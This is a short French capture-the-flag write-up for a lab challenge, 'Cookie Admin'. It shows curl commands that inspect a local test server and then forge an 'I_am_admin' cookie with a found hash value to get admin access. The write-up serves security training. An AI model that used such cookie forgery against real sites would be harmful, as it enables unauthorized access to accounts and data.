Flag 7 - Cookie Admin

Quand on ouvre la page :

http://192.168.1.47/


En récupérant le html avec curl :

curl -I http://192.168.1.47


On voit un cookie :

<img width="769" height="154" alt="image" src="https://github.com/user-attachments/assets/5e6d1951-d4a8-4d7a-9f56-5a86e0011d60" />

L'application utilise un cookie non sécurisé pour vérifier si on est admin.


Après plusieurs essais, la valeur admin valide est :

b326b5062b2f0e69046810717534cb09


On envoie un requête avec le cookie admin :


curl -s "http://192.168.1.47/index.php" \
  -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09"
